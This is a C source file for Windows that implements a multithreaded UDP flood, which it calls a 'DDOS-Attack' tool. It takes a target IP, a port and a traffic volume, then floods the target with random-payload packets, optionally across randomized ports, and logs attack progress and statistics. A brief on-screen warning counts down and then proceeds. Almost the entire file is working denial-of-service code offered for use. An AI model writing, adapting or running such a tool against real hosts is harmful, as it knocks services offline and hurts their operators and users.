#define _WIN32_WINNT 0x0600
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <process.h>
#include <stdbool.h>

#pragma comment(lib, "ws2_32.lib")

// ======================== Configuration structure ========================
#define MAX_BURST_SIZE 256   // Prevent stack overflow

typedef struct {
    char *target_ip;          // Target IP
    int target_port;          // Target port
    long long total_packets;  // Total packets
    int packet_size;          // Packet size (bytes)
    int num_threads;          // Number of threads
    int burst_size;           // Packets per burst
    double rate_limit;        // Rate limit (seconds per burst)
    int duration;             // Duration (seconds)
    int src_port_base;        // Source port base (-1 = random)
    bool random_target_port;  // Randomize target port
    bool no_prealloc;         // Disable pre-allocation
    char *log_file;           // Log file path
    bool no_interactive;      // Skip confirmation
    int max_retries;          // Max retry count
} Config;

Config g_config;  // Global configuration

// ======================== Shared statistics (atomic operations) ========================
static volatile long long total_sent = 0;     // Total packets sent
static volatile long long total_bytes = 0;    // Total bytes sent
static volatile long long total_dropped = 0;  // Total packets dropped
static volatile bool stop_flag = false;       // Stop flag

// ======================== Pre-allocated address array ========================
static struct sockaddr_in *port_addrs = NULL;

// ======================== Logging ========================
static FILE *log_fp = NULL;

// Log output function (writes to both console and file)
static void log_msg(const char *fmt, ...) {
    va_list args;
    va_start(args, fmt);
    vprintf(fmt, args);
    va_end(args);
    if (log_fp) {
        va_start(args, fmt);
        vfprintf(log_fp, fmt, args);
        va_end(args);
        fflush(log_fp);
    }
}

// ======================== Ctrl+C handler ========================
static BOOL WINAPI console_ctrl_handler(DWORD ctrl_type) {
    if (ctrl_type == CTRL_C_EVENT || ctrl_type == CTRL_BREAK_EVENT) {
        stop_flag = true;
        log_msg("\n[!] Received Ctrl+C, stopping...\n");
        return TRUE;
    }
    return FALSE;
}

// ======================== Clear screen ========================
static void clear_screen(void) {
    system("cls");
}

// ======================== Banner ========================
static void show_banner(void) {
    clear_screen();
    
    // ================== Warning page ===================
    printf("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   Sucodesu\n");
    printf("M       MMM M       MMM MMM     MMM MM       MM   Sucodesu\n");
    printf("M  MMMM   M M  MMMM   M M   MMM   M M  MMMMM  M   Sucodesu\n");
    printf("M  MMMMM  M M  MMMMM  M M  MMMMM  M M        MM   Sucodesu\n");
    printf("M  MMMMM  M M  MMMMM  M M  MMMMM  M MMMMMMM   M   Sucodesu\n");
    printf("M  MMMM   M M  MMMM   M M   MMM   M M   MMM   M   Sucodesu\n");
    printf("M        MM M        MM MMM     MMM MM       MM   Sucodesu\n");
    printf("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   Sucodesu\n");
    printf("\n");
    
    printf("========================= WARNING ==========================\n");
    printf("You are crossing the legal and ethical boundary. \n");
    printf("Please exit immediately, or wait 3 seconds to start.\n");
    printf("============================================================\n");
    Sleep(1000);
    for (int i = 3; i > 0; i--) {
        printf("%d\n", i);
        Sleep(1000);
    }
    printf("Starting...\n");
    Sleep(500);
    
    // ====== 2. Clear screen then show figlet ASCII art ======
    clear_screen();
    
    // Try figlet DDOS-Attack first
    int ret = system("figlet DDOS-Attack 2>nul");
    if (ret != 0) {
        // If figlet is unavailable, use the ASCII fallback
        printf(r" ____  ____   ___  ____          _   _   _             _     \n");
        printf(r"|  _ \|  _ \ / _ \/ ___|        / \ | |_| |_ __ _  ___| | __ \n");
        printf(r"| | | | | | | | | \___ \ _____ / _ \| __| __/ _` |/ __| |/ / \n");
        printf(r"| |_| | |_| | |_| |___) |_____/ ___ \ |_| || (_| | (__|   <  \n");
        printf(r"|____/|____/ \___/|____/     /_/   \_\__|\__\__,_|\___|_|\_\ \n");
    }
    printf("Author  : Su-StackTrace\n");
    printf("GitHub  : https://github.com/BC-809/DDoS-Attack_t3g85hxb670.git\n\n");
}

// ======================== Built-in argument parsing (no getopt dependency) ========================
static void print_usage(const char *prog) {
    fprintf(stderr,
        "Usage: %s -t <targetIP> -p <port> -g <GB> [options]\n"
        "  -t, --target        Target IP address\n"
        "  -p, --port          Target UDP port\n"
        "  -g, --gb            Total traffic (GB)\n"
        "  -P, --processes     Number of threads (default 4)\n"
        "  -T  --threads       Same as -P\n"
        "  -b, --burst         Packets per burst (max %d, default 50)\n"
        "  -r, --rate          Rate limit (seconds per burst, default 0)\n"
        "  -d, --duration      Attack duration (seconds, 0 = until finished)\n"
        "  -s, --src-port      Source port base (offset per thread)\n"
        "      --size          Packet size (bytes, 64-65507, default 1490)\n"
        "      --random-port   Randomize target port per packet\n"
        "      --no-prealloc   Disable pre-allocation (saves memory, slightly slower)\n"
        "      --log           Log file path\n"
        "      --no-interactive Skip confirmation\n"
        "      --max-retries   Max retry count (default 3)\n"
        "  -h, --help          Show this help\n",
        prog, MAX_BURST_SIZE);
    exit(1);
}

static void parse_args(int argc, char **argv) {
    // Set defaults
    g_config.target_ip = NULL;
    g_config.target_port = 0;
    g_config.total_packets = 0;
    g_config.packet_size = 1490;
    g_config.num_threads = 4;
    g_config.burst_size = 50;
    g_config.rate_limit = 0.0;
    g_config.duration = 0;
    g_config.src_port_base = -1;
    g_config.random_target_port = false;
    g_config.no_prealloc = false;
    g_config.log_file = NULL;
    g_config.no_interactive = false;
    g_config.max_retries = 3;

    double gb = 0.0;

    // Manually iterate command-line arguments
    for (int i = 1; i < argc; i++) {
        char *arg = argv[i];
        if (strcmp(arg, "-h") == 0 || strcmp(arg, "--help") == 0) {
            print_usage(argv[0]);
        }
        else if (strcmp(arg, "-t") == 0 || strcmp(arg, "--target") == 0) {
            if (++i < argc) g_config.target_ip = _strdup(argv[i]);
            else { fprintf(stderr, "-t missing argument\n"); exit(1); }
        }
        else if (strcmp(arg, "-p") == 0 || strcmp(arg, "--port") == 0) {
            if (++i < argc) g_config.target_port = atoi(argv[i]);
            else { fprintf(stderr, "-p missing argument\n"); exit(1); }
        }
        else if (strcmp(arg, "-g") == 0 || strcmp(arg, "--gb") == 0) {
            if (++i < argc) gb = atof(argv[i]);
            else { fprintf(stderr, "-g missing argument\n"); exit(1); }
        }
        else if (strcmp(arg, "-P") == 0 || strcmp(arg, "--processes") == 0 ||
                 strcmp(arg, "-T") == 0 || strcmp(arg, "--threads") == 0) {
            if (++i < argc) g_config.num_threads = atoi(argv[i]);
            else { fprintf(stderr, "%s missing argument\n", arg); exit(1); }
        }
        else if (strcmp(arg, "-b") == 0 || strcmp(arg, "--burst") == 0) {
            if (++i < argc) g_config.burst_size = atoi(argv[i]);
            else { fprintf(stderr, "-b missing argument\n"); exit(1); }
        }
        else if (strcmp(arg, "-r") == 0 || strcmp(arg, "--rate") == 0) {
            if (++i < argc) g_config.rate_limit = atof(argv[i]);
            else { fprintf(stderr, "-r missing argument\n"); exit(1); }
        }
        else if (strcmp(arg, "-d") == 0 || strcmp(arg, "--duration") == 0) {
            if (++i < argc) g_config.duration = atoi(argv[i]);
            else { fprintf(stderr, "-d missing argument\n"); exit(1); }
        }
        else if (strcmp(arg, "-s") == 0 || strcmp(arg, "--src-port") == 0) {
            if (++i < argc) g_config.src_port_base = atoi(argv[i]);
            else { fprintf(stderr, "-s missing argument\n"); exit(1); }
        }
        else if (strcmp(arg, "--size") == 0) {
            if (++i < argc) g_config.packet_size = atoi(argv[i]);
            else { fprintf(stderr, "--size missing argument\n"); exit(1); }
        }
        else if (strcmp(arg, "--random-port") == 0) {
            g_config.random_target_port = true;
        }
        else if (strcmp(arg, "--no-prealloc") == 0) {
            g_config.no_prealloc = true;
        }
        else if (strcmp(arg, "--log") == 0) {
            if (++i < argc) g_config.log_file = _strdup(argv[i]);
            else { fprintf(stderr, "--log missing argument\n"); exit(1); }
        }
        else if (strcmp(arg, "--no-interactive") == 0) {
            g_config.no_interactive = true;
        }
        else if (strcmp(arg, "--max-retries") == 0) {
            if (++i < argc) g_config.max_retries = atoi(argv[i]);
            else { fprintf(stderr, "--max-retries missing argument\n"); exit(1); }
        }
        else {
            fprintf(stderr, "Unknown argument: %s\n", arg);
            print_usage(argv[0]);
        }
    }

    // Check required arguments
    if (!g_config.target_ip || g_config.target_port == 0 || gb <= 0.0) {
        fprintf(stderr, "Missing required arguments (-t, -p, -g).\n");
        print_usage(argv[0]);
    }

    // Clamp burst size
    if (g_config.burst_size > MAX_BURST_SIZE) {
        fprintf(stderr, "Burst size limited to %d\n", MAX_BURST_SIZE);
        g_config.burst_size = MAX_BURST_SIZE;
    }
    if (g_config.burst_size < 1) g_config.burst_size = 1;

    // Validate packet size
    if (g_config.packet_size < 64) g_config.packet_size = 64;
    if (g_config.packet_size > 65507) g_config.packet_size = 65507;

    // Compute total packets
    g_config.total_packets = (long long)(gb * 1024.0 * 1024.0 * 1024.0 / g_config.packet_size);
    if (g_config.total_packets <= 0) {
        fprintf(stderr, "Traffic too small.\n");
        exit(1);
    }

    if (g_config.num_threads <= 0) g_config.num_threads = 1;
    if (g_config.max_retries < 0) g_config.max_retries = 0;
}

// ======================== Retry utility (with delay, retry only on WSAEWOULDBLOCK) ========================
static bool send_with_retry(SOCKET sockfd, const void *buf, size_t len,
                            const struct sockaddr *dest, socklen_t addrlen,
                            int max_retries) {
    int attempts = 0;
    while (attempts < max_retries) {
        int n = sendto(sockfd, (const char*)buf, (int)len, 0, dest, addrlen);
        if (n > 0) return true;  // Sent successfully
        if (n == SOCKET_ERROR) {
            int err = WSAGetLastError();
            if (err == WSAEWOULDBLOCK) {
                attempts++;
                Sleep(1);  // Tiny delay to reduce CPU spinning
                continue;
            } else {
                return false;  // Other error, give up
            }
        }
        attempts++;
    }
    return false;
}

// ======================== Thread function ========================
static unsigned __stdcall sender_thread(void *arg) {
    long thread_id = (long)arg;
    // Create UDP socket
    SOCKET sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd == INVALID_SOCKET) {
        log_msg("Thread %ld: socket creation failed\n", thread_id);
        return 1;
    }

    // Bind source port (if specified)
    if (g_config.src_port_base >= 0) {
        int src_port = g_config.src_port_base + (int)thread_id;
        struct sockaddr_in src_addr;
        src_addr.sin_family = AF_INET;
        src_addr.sin_port = htons((u_short)src_port);
        src_addr.sin_addr.s_addr = INADDR_ANY;
        if (bind(sockfd, (struct sockaddr*)&src_addr, sizeof(src_addr)) == SOCKET_ERROR) {
            log_msg("Thread %ld: bind to port %d failed (%d), using random port\n",
                    thread_id, src_port, WSAGetLastError());
        }
    }

    // Target address (initial value)
    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons((u_short)g_config.target_port);
    inet_pton(AF_INET, g_config.target_ip, &target_addr.sin_addr);

    // Allocate payload buffer
    unsigned char *payload = (unsigned char*)malloc(g_config.packet_size);
    if (!payload) {
        closesocket(sockfd);
        log_msg("Thread %ld: malloc failed\n", thread_id);
        return 1;
    }
    // Fill payload with random data (per-thread independent seed)
    unsigned int seed;
    rand_s(&seed);
    for (int i = 0; i < g_config.packet_size; i++) {
        payload[i] = (unsigned char)(rand_r(&seed) & 0xff);
    }

    // Compute packets this thread should send
    long long packets_to_send = g_config.total_packets / g_config.num_threads;
    if (thread_id < g_config.total_packets % g_config.num_threads) {
        packets_to_send++;
    }

    long long sent = 0;          // Local sent counter
    long long bytes_sent = 0;    // Local bytes counter
    long long dropped = 0;       // Local dropped counter
    // Last reported values (for incremental update)
    long long last_sent = 0, last_bytes = 0, last_dropped = 0;

    while (!stop_flag && sent < packets_to_send) {
        int to_send = g_config.burst_size;
        if (sent + to_send > packets_to_send) {
            to_send = (int)(packets_to_send - sent);
        }

        if (g_config.random_target_port) {
            // Random port mode: send one by one
            for (int i = 0; i < to_send; i++) {
                if (stop_flag || sent >= packets_to_send) break;
                int port = 1 + (rand_r(&seed) % 65535);
                if (g_config.no_prealloc || port_addrs == NULL) {
                    // No pre-allocation, set port each time
                    target_addr.sin_port = htons((u_short)port);
                    // sin_addr remains unchanged, no need to reset
                } else {
                    // Directly copy the pre-allocated address structure
                    target_addr = port_addrs[port];
                }
                bool ok = send_with_retry(sockfd, payload, g_config.packet_size,
                                          (struct sockaddr*)&target_addr,
                                          sizeof(target_addr), g_config.max_retries);
                if (ok) {
                    sent++;
                    bytes_sent += g_config.packet_size;
                } else {
                    dropped++;
                }
            }
        } else {
            // Fixed port mode
            for (int i = 0; i < to_send; i++) {
                if (stop_flag || sent >= packets_to_send) break;
                bool ok = send_with_retry(sockfd, payload, g_config.packet_size,
                                          (struct sockaddr*)&target_addr,
                                          sizeof(target_addr), g_config.max_retries);
                if (ok) {
                    sent++;
                    bytes_sent += g_config.packet_size;
                } else {
                    dropped++;
                }
            }
        }

        // Incrementally update global statistics (using Interlocked atomic operations)
        long long delta_sent = sent - last_sent;
        long long delta_bytes = bytes_sent - last_bytes;
        long long delta_dropped = dropped - last_dropped;
        if (delta_sent > 0) InterlockedAdd64(&total_sent, delta_sent);
        if (delta_bytes > 0) InterlockedAdd64(&total_bytes, delta_bytes);
        if (delta_dropped > 0) InterlockedAdd64(&total_dropped, delta_dropped);
        last_sent = sent;
        last_bytes = bytes_sent;
        last_dropped = dropped;

        // Rate limit
        if (g_config.rate_limit > 0.0) {
            Sleep((DWORD)(g_config.rate_limit * 1000));
        }
        // Otherwise busy loop, let the OS handle scheduling
    }

    // Final update (to avoid missed reports)
    long long delta_sent = sent - last_sent;
    long long delta_bytes = bytes_sent - last_bytes;
    long long delta_dropped = dropped - last_dropped;
    if (delta_sent > 0) InterlockedAdd64(&total_sent, delta_sent);
    if (delta_bytes > 0) InterlockedAdd64(&total_bytes, delta_bytes);
    if (delta_dropped > 0) InterlockedAdd64(&total_dropped, delta_dropped);

    free(payload);
    closesocket(sockfd);
    return 0;
}

// ======================== Main function ========================
int main(int argc, char **argv) {
    // Initialize Winsock
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) {
        fprintf(stderr, "WSAStartup failed\n");
        return 1;
    }

    // Parse command-line arguments
    parse_args(argc, argv);

    // Open log file (continue on failure)
    if (g_config.log_file) {
        log_fp = fopen(g_config.log_file, "a");
        if (!log_fp) {
            fprintf(stderr, "Warning: could not open log file '%s', continuing.\n", g_config.log_file);
        } else {
            time_t now = time(NULL);
            fprintf(log_fp, "\n--- Attack session started at %s", ctime(&now));
            fflush(log_fp);
        }
    }

    // Register Ctrl+C handler
    SetConsoleCtrlHandler(console_ctrl_handler, TRUE);

    // Show banner (warning page + figlet ASCII art)
    show_banner();

    // Validate target IP
    struct sockaddr_in test_addr;
    if (inet_pton(AF_INET, g_config.target_ip, &test_addr.sin_addr) != 1) {
        log_msg("Invalid target IP.\n");
        goto cleanup;
    }
    if (g_config.target_port < 1 || g_config.target_port > 65535) {
        log_msg("Port out of range.\n");
        goto cleanup;
    }

    // Pre-allocate address array for random port mode (unless disabled)
    if (g_config.random_target_port && !g_config.no_prealloc) {
        port_addrs = (struct sockaddr_in*)malloc(65536 * sizeof(struct sockaddr_in));
        if (!port_addrs) {
            log_msg("Memory allocation failed, will use non-preallocated mode.\n");
            g_config.no_prealloc = true;
        } else {
            for (int i = 1; i <= 65535; i++) {
                port_addrs[i].sin_family = AF_INET;
                port_addrs[i].sin_port = htons((u_short)i);
                port_addrs[i].sin_addr = test_addr.sin_addr;
            }
            log_msg("[>] Random port pre-allocation enabled (65535 addresses).\n");
        }
    }

    // Print attack summary
    log_msg("\n[>] Attack summary:\n");
    log_msg("    Target: %s:%d (UDP)\n", g_config.target_ip, g_config.target_port);
    log_msg("    Total packets: %lld\n", g_config.total_packets);
    log_msg("    Packet size: %d bytes\n", g_config.packet_size);
    log_msg("    Threads: %d\n", g_config.num_threads);
    if (g_config.src_port_base >= 0)
        log_msg("    Source port base: %d (offset per thread)\n", g_config.src_port_base);
    if (g_config.rate_limit > 0.0)
        log_msg("    Rate limit: %.3f seconds per burst\n", g_config.rate_limit);
    if (g_config.duration > 0)
        log_msg("    Duration: %d seconds\n", g_config.duration);
    if (g_config.random_target_port) {
        log_msg("    Random target port: ON");
        if (port_addrs && !g_config.no_prealloc)
            log_msg(" (with pre-allocation)\n");
        else
            log_msg(" (without pre-allocation)\n");
    }
    log_msg("    Burst size: %d\n", g_config.burst_size);
    log_msg("    Max retries: %d\n", g_config.max_retries);
    log_msg("    sendmmsg: not supported (Windows falls back to sendto)\n");

    // Interactive confirmation
    if (!g_config.no_interactive) {
        printf("\n[!] Confirm attack (yes/no): ");
        fflush(stdout);
        char buf[8];
        if (!fgets(buf, sizeof(buf), stdin) || strncmp(buf, "yes", 3) != 0) {
            log_msg("[>] Cancelled.\n");
            goto cleanup;
        }
    }

    // Allocate thread handle array
    HANDLE *threads = (HANDLE*)malloc(g_config.num_threads * sizeof(HANDLE));
    if (!threads) {
        log_msg("Thread allocation failed\n");
        goto cleanup;
    }

    // Obtain high-resolution timer frequency
    LARGE_INTEGER freq, start_ts, now_ts;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start_ts);

    // Start threads
    int created = 0;
    for (int i = 0; i < g_config.num_threads; i++) {
        threads[i] = (HANDLE)_beginthreadex(NULL, 0, sender_thread, (void*)(long)i, 0, NULL);
        if (!threads[i]) {
            log_msg("Failed to create thread %d\n", i);
            break;
        }
        created++;
    }

    // If fewer threads were created than expected, stop immediately
    if (created < g_config.num_threads) {
        stop_flag = true;
        log_msg("[!] Some threads failed to start, attack aborted. Waiting for created threads to exit...\n");
        if (created > 0) {
            WaitForMultipleObjects(created, threads, TRUE, 5000);
        }
        for (int i = 0; i < created; i++) {
            CloseHandle(threads[i]);
        }
        free(threads);
        goto cleanup;
    }

    // Progress monitoring loop
    while (!stop_flag) {
        long long sent = InterlockedCompareExchange64(&total_sent, 0, 0);
        if (sent >= g_config.total_packets) break;
        if (g_config.duration > 0) {
            QueryPerformanceCounter(&now_ts);
            double elapsed = (double)(now_ts.QuadPart - start_ts.QuadPart) / freq.QuadPart;
            if (elapsed >= g_config.duration) {
                stop_flag = true;
                break;
            }
        }
        if (sent > 0) {
            QueryPerformanceCounter(&now_ts);
            double elapsed = (double)(now_ts.QuadPart - start_ts.QuadPart) / freq.QuadPart;
            if (elapsed < 0.001) elapsed = 0.001;
            double progress = (double)sent / g_config.total_packets * 100.0;
            int bar_len = 30;
            int filled = (int)(bar_len * progress / 100.0);
            char bar[31];
            memset(bar, '█', filled);
            memset(bar+filled, '░', bar_len - filled);
            bar[bar_len] = '\0';
            double eta = (elapsed / sent) * (g_config.total_packets - sent);
            double rate = sent / elapsed;
            double data_gb = (double)InterlockedCompareExchange64(&total_bytes, 0, 0) / (1024.0*1024*1024);
            long long dropped = InterlockedCompareExchange64(&total_dropped, 0, 0);
            printf("\r[%s] %.1f%% | %lld/%lld packets | %.3f GB | Rate: %.1f pps | Dropped: %lld | ETA: %.0fs",
                   bar, progress, sent, g_config.total_packets, data_gb, rate, dropped, eta);
            fflush(stdout);
        }
        Sleep(500);
    }

    // Set stop flag
    stop_flag = true;

    // Wait for all threads to finish
    WaitForMultipleObjects(g_config.num_threads, threads, TRUE, 5000);
    for (int i = 0; i < g_config.num_threads; i++) {
        CloseHandle(threads[i]);
    }
    free(threads);

    // Final statistics
    QueryPerformanceCounter(&now_ts);
    double elapsed = (double)(now_ts.QuadPart - start_ts.QuadPart) / freq.QuadPart;
    long long final_sent = InterlockedCompareExchange64(&total_sent, 0, 0);
    long long final_bytes = InterlockedCompareExchange64(&total_bytes, 0, 0);
    long long final_dropped = InterlockedCompareExchange64(&total_dropped, 0, 0);
    log_msg("\n[>] Attack finished.\n");
    log_msg("    Packets sent: %lld\n", final_sent);
    log_msg("    Packets dropped: %lld\n", final_dropped);
    log_msg("    Total data: %.4f GB\n", final_bytes / (1024.0*1024*1024));
    log_msg("    Elapsed time: %.2f seconds\n", elapsed);
    if (elapsed > 0.0) {
        log_msg("    Average rate: %.1f pps\n", final_sent / elapsed);
    }

cleanup:
    // Release resources
    if (port_addrs) free(port_addrs);
    if (g_config.target_ip) free(g_config.target_ip);
    if (g_config.log_file) free(g_config.log_file);
    if (log_fp) fclose(log_fp);
    WSACleanup();
    return 0;
}
